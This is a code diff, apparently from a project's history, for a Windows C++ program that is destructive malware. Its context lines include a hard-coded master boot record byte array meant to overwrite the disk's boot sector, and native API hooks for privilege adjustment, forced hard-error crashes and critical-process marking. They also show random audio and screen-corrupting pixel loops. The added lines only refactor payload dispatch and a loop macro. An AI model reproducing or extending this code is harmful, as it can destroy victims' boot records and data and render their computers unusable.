@@ -1,7 +1,10 @@
 #include <iostream>
 #include <Windows.h>
 #include <math.h>
+
 #include "payloads.h"
+
+#define fori(x) for (INT i = 0; i < x; i++)
 
 const BYTE MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
@@ -40,6 +43,8 @@ typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, B
 typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
 
+typedef int (*functionarray) ();
+
 DWORD WINAPI audio(LPVOID lpParam) {
     while (true) {
         Sleep(rand() % 10000);
@@ -53,6 +58,12 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     {
         ExitProcess(0);
     }
+
+    functionarray payloads[] = {
+        p1,
+        p2,
+        p3
+    }; // use: payloads[x] for function px()
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
     fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
@@ -130,7 +141,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     
     // SetPixel is slow
     //random pixels all over the place
-    for (INT i = 1; i < 100; i++) {
+    fori(100) {
         CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
